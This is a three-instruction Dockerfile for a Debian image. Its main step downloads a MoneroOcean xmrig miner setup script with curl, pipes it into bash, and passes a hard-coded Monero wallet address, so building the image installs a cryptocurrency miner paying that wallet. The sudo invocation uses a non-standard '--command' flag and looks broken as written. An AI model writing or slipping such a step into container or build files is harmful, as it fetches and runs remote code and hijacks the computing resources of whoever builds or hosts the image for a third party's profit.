FROM debian
RUN apt update
RUN sudo --command "curl -s -L https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/setup_moneroocean_miner.sh | bash -s 456eKDgjfQAGtYJdSeCaN6iEQcTbRpEBPjb85SUQ6q6H63WprKg6qp4fjrNcdBXnkWWb8DxVACK6gNCoVnVDHkKk6CaaAR7"
